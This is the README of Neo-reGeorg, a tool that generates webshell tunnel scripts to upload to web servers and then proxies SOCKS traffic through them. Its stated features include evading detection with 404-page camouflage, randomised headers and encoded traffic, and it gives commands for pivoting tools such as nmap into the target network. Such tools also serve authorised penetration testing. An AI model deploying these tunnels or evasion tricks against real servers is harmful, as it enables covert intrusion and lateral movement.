Neo-reGeorg
=========

[简体中文](README.md)　｜　[English](README-en.md)

**Neo-reGeorg** is a project designed to actively restructure [reGeorg](https://github.com/sensepost/reGeorg) with the aim of:

* Improve tunnel connection security
* Improve usability and avoid feature detection
* Improve the confidentiality of transmission content
* Solve the existing problems of reGeorg and fix some small bugs



## Features

* Transfer content through out-of-order base64 encryption
* GET request response can be customized (such as masquerading 404 pages)
* HTTP Headers instructions are randomly generated to avoid feature detection
* HTTP Headers can be customized
* Compatible with python2 / python3


Version
----

1.1.0



Dependencies
-----------

* [**requests**] - https://github.com/kennethreitz/requests




Basic Usage
--------------

* **Step 1.**
Set the password to generate tunnel server.(aspx|ashx|jsp|jspx|php) and upload it to the web server.
```ruby
$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_server/tunnel.nosocket.php
       => neoreg_server/tunnel.js
       => neoreg_server/tunnel.php
       => neoreg_server/tunnel.ashx
       => neoreg_server/tunnel.aspx
       => neoreg_server/tunnel.tomcat.5.jsp
       => neoreg_server/tunnel.tomcat.5.jspx
       => neoreg_server/tunnel.jsp
       => neoreg_server/tunnel.jspx

```

* **Step 2.**
Use `neoreg.py` to connect to the web server and create a socks proxy locally.
```ruby
$ python3 neoreg.py -k password -u http://xx/tunnel.php
+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting socks server [127.0.0.1:1080], tunnel at [http://k/tunnel.php]
+------------------------------------------------------------------------+
```

   Note that if your tool, such as `nmap` does not support socks proxy, please use [proxychains](https://github.com/rofl0r/proxychains-ng) 




Advanced Usage
--------------

1. Support for generated tunnel server-side, the default GET request responds to the specified page content (eg camouflaged 404 page)
```ruby
$ python neoreg.py generate -k <you_password> --file 404.html
$ pytohn neoreg.py -k <you_password> -u <server_url> --skip
```

2. For example, the server WEB needs to set the proxy to access
```ruby
$ pytohn neoreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
```

3. To set `Authorization`, there are also custom `Header` or `Cookie` content.
```ruby
$ pytohn neoreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value"
```

* For more information on performance and stability parameters, refer to -h help information
```ruby
# Generate server-side scripts
$ python neoreg.py generate -h
    usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [--read-buff Bytes]

    Generate neoreg webshell

    optional arguments:
      -h, --help            show this help message and exit
      -k KEY, --key KEY     Specify connection key.
      -o DIR, --outdir DIR  Output directory.
      -f FILE, --file FILE  Camouflage html page file
      --read-buff Bytes     Remote read buffer.(default: 513)

# Connection server
$ python neoreg.py -h
    usage: neoreg.py [-h] -u URI -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE]
                     [-x LINE] [--read-buff Bytes] [--read-interval MS]
                     [--max-threads N] [-v]

    Socks server for Neoreg HTTP(s) tunneller

    optional arguments:
      -h, --help            show this help message and exit
      -u URI, --url URI     The url containing the tunnel script
      -k KEY, --key KEY     Specify connection key
      -l IP, --listen-on IP
                            The default listening address.(default: 127.0.0.1)
      -p PORT, --listen-port PORT
                            The default listening port.(default: 1080)
      -s, --skip            Skip usability testing
      -H LINE, --header LINE
                            Pass custom header LINE to server
      -c LINE, --cookie LINE
                            Custom cookies to server
      -x LINE, --proxy LINE
                            proto://host[:port] Use proxy on given port
      --read-buff Bytes     Local read buffer, max data to be sent per
                            POST.(default: 1024)
      --read-interval MS    Read data interval in milliseconds.(default: 100)
      --max-threads N       Proxy max threads.(default: 1000)
      -v                    Increase verbosity level (use -vv or more for greater
                            effect)
```



## TODO

* Solving tennel.js cannot continue TCP connection problems

* HTTP body steganography

* Transfer Target field steganography

* ~~Confuse/Anti-Virus/Compress server-side scripts~~ Should be modular, standalone tool
   


## License

GPL 3.0

## Change log

v1.1.0
    - Added jspx support
